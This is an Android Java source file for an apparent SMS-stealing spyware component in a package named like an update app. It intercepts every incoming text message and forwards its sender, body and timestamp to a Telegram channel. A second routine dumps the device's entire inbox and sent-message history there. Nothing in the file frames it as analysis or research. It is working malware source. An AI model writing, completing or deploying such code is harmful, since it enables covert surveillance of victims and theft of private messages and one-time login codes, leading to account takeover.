package com.kasari.update;

import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.os.*;
import android.telephony.SmsMessage;
import java.text.SimpleDateFormat;
import java.util.*;

public class SmsForwarder extends BroadcastReceiver {

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;
        Bundle bundle = intent.getExtras();
        if (bundle == null) return;
        try {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;
            String format = bundle.getString("format");
            for (Object pdu : pdus) {
                SmsMessage msg = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    ? SmsMessage.createFromPdu((byte[]) pdu, format)
                    : SmsMessage.createFromPdu((byte[]) pdu);
                if (msg == null) continue;
                String sender = msg.getDisplayOriginatingAddress();
                String body   = msg.getDisplayMessageBody();
                String time   = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                    .format(new Date(msg.getTimestampMillis()));
                TelegramController.sendMessage(
                    "📩 SMS\nFrom: " + sender + "\nMsg: " + body + "\nTime: " + time);
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    // ── Send full SMS history ─────────────────────────────────────────────────
    public static void sendAllHistory(Context ctx) {
        new Thread(() -> {
            int total = 0;
            total += queryBox(ctx, "content://sms/inbox", false);
            total += queryBox(ctx, "content://sms/sent",  true);
            TelegramController.sendMessage("✅ SMS done. Total: " + total);
        }).start();
    }

    private static int queryBox(Context ctx, String uri, boolean isSent) {
        int count = 0;
        Cursor c = null;
        try {
            c = ctx.getContentResolver().query(Uri.parse(uri),
                new String[]{"address","body","date"}, null, null, "date ASC");
            if (c != null && c.moveToFirst()) {
                do {
                    String addr = c.getString(0);
                    String body = c.getString(1);
                    long ts = c.getLong(2);
                    String time = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                        .format(new Date(ts));
                    String label = isSent ? "[Sent to: " + addr + "]" : addr;
                    TelegramController.sendMessage(
                        "📩 " + (isSent ? "Sent" : "Inbox") + "\n" +
                        "From/To: " + label + "\nMsg: " + body + "\nTime: " + time);
                    count++;
                    Thread.sleep(400);
                } while (c.moveToNext());
            }
        } catch (Exception e) { e.printStackTrace(); }
        finally { if (c != null) c.close(); }
        return count;
    }
}
